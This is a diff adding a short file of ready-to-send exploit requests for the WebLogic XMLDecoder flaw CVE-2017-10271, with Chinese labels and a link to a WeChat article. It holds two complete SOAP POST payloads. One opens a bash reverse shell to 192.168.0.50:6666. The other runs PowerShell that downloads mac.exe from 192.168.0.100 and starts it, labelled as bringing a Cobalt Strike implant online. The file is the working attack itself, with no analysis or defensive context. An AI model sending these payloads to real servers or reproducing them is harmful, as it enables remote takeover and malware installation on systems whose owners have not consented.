@@ -1,0 +1,67 @@
+CVE-2017-10271
+https://mp.weixin.qq.com/s/r_ifxjyu5BiiZoB8n9GoEA
+反弹shell
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.0.107:7001
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: text/xml
+Content-Length: 633
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java version="1.4.0" class="java.beans.XMLDecoder">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>bash -i &gt;&amp; /dev/tcp/192.168.0.50/6666 0&gt;&amp;1</string>
+</void>
+</array>
+<void method="start"/></void>
+</java>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
+
+运行木马上线cs
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.0.105:7001
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: text/xml
+Content-Length: 897
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java version="1.4.0" class="java.beans.XMLDecoder">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>powershell</string>
+                        </void>
+                        <void index="1">
+                            <string>-Command</string>
+                        </void>
+                        <void index="2">
+                            <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.0.100/mac.exe','mac.exe');start-process mac.exe</string>
+</void>
+</array>
+<void method="start"/></void>
+</java>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
